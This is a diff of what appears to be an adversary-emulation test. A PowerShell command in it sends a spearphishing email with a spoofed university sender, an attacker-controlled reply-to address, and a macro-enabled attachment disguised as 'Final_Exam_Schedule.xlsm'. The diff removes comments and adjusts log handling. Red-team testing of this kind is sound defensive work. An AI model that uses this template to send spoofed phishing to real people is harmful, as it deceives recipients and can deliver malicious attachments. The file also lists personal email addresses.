@@ -16,27 +16,27 @@ atomic_tests:
       smtp_server:
         description: SMTP server to use
         type: string
-        default: "localhost"  # Use localhost for testing (e.g., hMailServer or Postfix)
+        default: "localhost"
 
       smtp_port:
         description: SMTP port
         type: integer
-        default: 25  # Standard SMTP port for hMailServer
+        default: 25
 
       sender_visible_email:
         description: Email address to spoof in the "From" header
         type: string
-        default: '"ENETCom University" <chaymabouattour@ieee.com>'  # Official-looking sender
+        default: '"ENETCom University" <chaymabouattour@ieee.com>'
 
       reply_to_email:
         description: Reply-To email address
         type: string
-        default: "chaymaoumayma2003@gmail.com"  # Real attacker-controlled email for replies
+        default: "chaymaoumayma2003@gmail.com"
 
       recipient_email:
         description: Recipient email address
         type: string
-        default: "oumaymakabadou2@gmail.com"  # Replace with actual target email
+        default: "oumaymakabadou2@gmail.com"
 
       subject:
         description: Customized subject of the email
@@ -68,7 +68,7 @@ atomic_tests:
       attachment_path:
         description: Path to the malicious attachment
         type: string
-        default: "C:\\temp\\Final_Exam_Schedule.xlsm"  # Rename to appear legitimate
+        default: "C:\\temp\\Final_Exam_Schedule.xlsm"
 
       log_file:
         description: Path to the log file
@@ -82,7 +82,7 @@ atomic_tests:
       command: |
         $smtpServer = "#{smtp_server}"
         $smtpPort = #{smtp_port}
-        $senderVisibleEmail = "#{sender_visible_email}"  # Spoofed visible From address
+        $senderVisibleEmail = "#{sender_visible_email}"
         $replyToEmail = "#{reply_to_email}"
         $recipientEmail = "#{recipient_email}"
         $subject = "#{subject}"
@@ -90,6 +90,7 @@ atomic_tests:
         #{body}
         '@
         $attachmentPath = "#{attachment_path}"
+        $logFile = "#{log_file}"
 
         # Create MailMessage object
         $mailMessage = New-Object System.Net.Mail.MailMessage
@@ -131,7 +132,7 @@ atomic_tests:
 
             # Log the result
             $logEntry = "Email sent to $recipientEmail successfully at $(Get-Date)"
-            Add-Content -Path "#{log_file}" -Value $logEntry
+            Add-Content -Path $logFile -Value $logEntry
         } catch {
             Write-Host "❌ Error sending email: $_"
             exit 1
